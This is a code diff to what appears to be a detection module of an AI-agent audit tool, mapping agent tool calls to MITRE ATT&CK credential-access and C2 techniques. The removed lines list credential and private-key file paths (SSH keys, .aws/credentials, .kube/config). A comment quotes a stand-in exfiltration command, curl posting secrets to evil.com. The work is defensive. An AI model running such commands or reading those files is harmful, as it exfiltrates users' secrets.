@@ -109,15 +109,25 @@ _TOOL_MAP: dict[str, dict[str, str]] = {
 _CREDENTIAL_ACCESS = _m("TA0006", "Credential Access", "T1552.001", "Credentials In Files")
 _PRIVATE_KEY = _m("TA0006", "Credential Access", "T1552.004", "Private Keys")
 
-_PRIVATE_KEY_PATTERNS = (
-    "id_rsa", "id_ed25519", "id_dsa", "id_ecdsa", ".pem", "-----begin", ".ssh/",
-)
-_CREDENTIAL_PATTERNS = (
-    ".aws/credentials", ".aws\\credentials", ".env", ".netrc", ".npmrc",
-    ".kube/config", ".kube\\config", "credentials.json", "service-account",
-    "secrets.yaml", "secrets.yml",
-    ".docker/config.json", ".docker\\config.json",
-    ".config/gcloud", ".config\\gcloud",
+# Credential and private-key recognition now lives in detection/traits.py, and
+# this module imports it rather than keeping a second copy.
+#
+# It used to keep its own tuple of substrings matched with `p in text`. That is
+# how `agentmetry.core.diagnostics.env_file` earned T1552.001 (#40): the tuple
+# contained a bare ".env". Worse than the false positive was the shape of the
+# bug. Two classifiers were answering "is this credential access" from
+# different data -- `classify_command` said no traits, the mapper said
+# T1552.001 -- and the sequence rules keyed off the mapper, the one with less
+# information and no test corpus. A disagreement between them was not merely
+# possible, it was undetectable.
+from agentmetry.core.audit.detection.traits import (  # noqa: E402
+    CREDENTIAL_ENV,
+    CREDENTIAL_ENV_DUMP,
+    CREDENTIAL_PATH,
+    ENV_FILE,
+    INTERPRETER_NETWORK,
+    PRIVATE_KEY_PATH,
+    mask_literals,
 )
 
 # Shell-wrapped network egress. `bash: curl -d @secrets https://evil.com` is a
@@ -148,6 +158,27 @@ def _reaches_remote_host(text: str) -> bool:
     return any(not _LOOPBACK.match(host) for host in hosts)
 
 
+def _shell_text(evidence: Any) -> str | None:
+    """The shell command inside `evidence`, or None if this is not shell text.
+
+    Masking is a statement about *shell* quoting, and applying it to anything
+    else is actively wrong. `_evidence_text` returns JSON for dict evidence,
+    where the entire command sits inside double quotes -- masking that blanks
+    the whole string and every content rule silently stops matching. A tool call
+    carrying `{"path": "~/.aws/credentials"}` has no shell quoting to reason
+    about either, and its quotes are JSON syntax rather than an author's intent.
+
+    So: mask when we have a command, and only then.
+    """
+    if isinstance(evidence, str):
+        return evidence
+    if isinstance(evidence, dict):
+        command = evidence.get("command")
+        if isinstance(command, str) and command:
+            return command
+    return None
+
+
 def _evidence_text(evidence: Any) -> str:
     if not evidence:
         return ""
@@ -172,12 +203,33 @@ def get_mitre_mapping(
     # 1. Content upgrades win — a read that touches a key is credential access,
     #    not generic collection.
     if text:
-        if any(p in text for p in _PRIVATE_KEY_PATTERNS):
+        # Same masking policy as classify_command: paths may be double-quoted
+        # and still be real, but a path inside single quotes or a heredoc is
+        # text somebody is writing, not a file somebody is reading. Structured
+        # evidence is not masked at all -- see _shell_text.
+        shell = _shell_text(evidence)
+        literal = mask_literals(shell, include_double=False).lower() if shell else text
+        written = mask_literals(shell).lower() if shell else text
+        if PRIVATE_KEY_PATH.search(literal):
             return _PRIVATE_KEY
-        if any(p in text for p in _CREDENTIAL_PATTERNS):
+        if (
+            CREDENTIAL_PATH.search(literal)
+            or ENV_FILE.search(literal)
+            or CREDENTIAL_ENV.search(text)
+            or CREDENTIAL_ENV_DUMP.search(written)
+        ):
             return _CREDENTIAL_ACCESS
         # A shell that reaches the network is C2, whatever the tool is called.
-        if _NETWORK_CLIENT.search(text) and _reaches_remote_host(text):
+        # An interpreter counts: `python -c "urllib.request.urlopen(...)"` is a
+        # network client, and in a container it is often the only one installed.
+        # INTERPRETER_NETWORK reads `literal`, not `written`: the payload of
+        # `python -c "urllib.request.urlopen(...)"` is double-quoted and is the
+        # program being run, so blanking it would hide the very thing being
+        # matched. Single quotes and heredocs are still masked, which is what
+        # keeps `echo 'python -c "urlopen"'` from firing.
+        if _reaches_remote_host(text) and (
+            _NETWORK_CLIENT.search(written) or INTERPRETER_NETWORK.search(literal)
+        ):
             return _C2
 
     # 2. Tool-name mapping on the method segment (the part after the last '.'),
